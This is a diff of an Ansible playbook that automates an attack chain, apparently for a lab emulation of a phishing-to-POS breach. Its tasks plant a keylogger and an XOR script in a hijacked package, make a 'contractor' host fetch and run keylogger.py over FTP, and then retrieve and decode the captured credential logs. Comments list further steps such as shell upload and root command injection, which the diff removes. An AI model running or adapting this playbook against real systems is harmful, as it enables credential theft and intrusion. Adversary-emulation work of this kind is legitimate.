@@ -4,25 +4,20 @@
 #     1. Send phishing email
 #     2. Download malicious software
 #     3. Obtain contractor's account username and password
-#     4. Login to Bullseye webserver as contractor
-#     5. Upload shell file to implement command injection 
-#     6. Run system command as root on web server
-#     7. Inject malicious software on POS firmware
-#     8. Obtain credentials
 #
 
 - name: package inject
   hosts: blackhat
   tasks:
     - name: hijack user-facing package
-      raw: python package.py
+      raw: python package.py keylogger.py
+    - name: upload xor encryption script
+      raw: python package.py xor.py
 - name: package download
   hosts: contractor
   tasks:
     - name: download the package
       raw: wget --user=anonymous --password='contractor@fazio.com' ftp://downloads.fazio.com:21/download/keylogger.py
-    - name: unpack the attachment
-      raw: grep -lir "keylogger" /home/ubuntu | xargs munpack
     - name: run the keylogger
       raw: python keylogger.py
 - name: recover captured credentials
@@ -30,3 +25,5 @@
   tasks:
     - name: download log file from ftp
       raw: wget --user=anonymous --password='contractor@fazio.com' ftp://ftp.fazio.com:21/upload/logs.txt
+    - name: decode keylogger file
+      raw: python decoder.py
